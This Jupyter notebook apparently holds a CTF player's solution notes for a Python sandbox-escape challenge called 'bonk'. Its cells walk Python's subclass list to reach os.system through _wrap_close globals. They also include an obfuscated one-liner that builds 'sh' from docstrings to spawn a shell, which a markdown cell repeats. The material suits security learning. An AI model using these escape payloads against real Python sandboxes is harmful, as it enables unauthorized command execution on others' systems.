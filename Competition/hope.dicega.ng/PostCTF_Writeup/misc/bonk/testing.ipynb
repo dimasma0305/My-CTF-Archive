{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# search for _wrap_close \n",
    "s =[i.__name__ for i in ().__class__.__base__.__subclasses__()]\n",
    "idx_wrap_close = s.index(\"_wrap_close\")\n",
    "print(f\"index of _wrap_close: {idx_wrap_close}\")\n",
    "\n",
    "# get index of os.system\n",
    "s = [i for i in ().__class__.__base__.__subclasses__()[idx_wrap_close].__init__.__globals__.keys()]\n",
    "idx_os_system = s.index(\"system\")\n",
    "print(f\"index of os.system: {idx_os_system}\")\n",
    "\n",
    "# shell\n",
    "s = [*().__class__.__base__.__subclasses__()[idx_wrap_close].__init__.__globals__.values()][idx_os_system]\n",
    "print(s('ls'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [],
   "source": [
    "# full payload shell\n",
    "s = ().__class__.__mro__[1].__subclasses__()[38](().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__.values())[47]([].__doc__[54].join([].__doc__).split([].__doc__[30])[20].split([].__doc__[85])[0].lstrip([].__doc__[54]))\n",
    "print(s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = [i.__name__ for i in ().__class__.__mro__[1].__subclasses__()]\n",
    "idx = s.index(\"list\")\n",
    "print(f\"index: {idx}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    ">>> ().__doc__.index(\"s\")\n",
    "19\n",
    ">>> ().__doc__.index(\"h\")\n",
    "56\n",
    "```\n",
    "\n",
    "payload\n",
    "\n",
    "```\n",
    "().__class__.__mro__[1].__subclasses__()[38](().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__.values())[47]([].__doc__[54].join([].__doc__).split([].__doc__[30])[20].split([].__doc__[85])[0].lstrip([].__doc__[54]))\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "e7370f93d1d0cde622a1f8e1c04877d8463912d04d973331ad4851f04de6915a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
